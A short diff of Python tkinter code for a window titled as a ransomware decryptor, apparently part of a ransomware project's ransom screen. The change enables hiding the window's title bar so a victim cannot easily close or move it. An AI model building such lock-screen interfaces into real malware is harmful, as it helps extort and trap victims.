@@ -16,7 +16,7 @@ class rescueWindow(object):
 
     def crearVentana(self):	#Método para crear la ventana.
         self.Ventana.title("R4Ns0mW4r3 d3cr1pt0R 2.0")	#Título de la ventana.
-        #self.Ventana.overrideredirect(1) #Esconde la barra superior.
+        self.Ventana.overrideredirect(1) #Esconde la barra superior.
         self.Ventana.attributes('-toolwindow', True) #No permite modificar atributos de la ventana.
         self.Ventana.geometry("1000x568")	#Tamaño de la ventana.
 
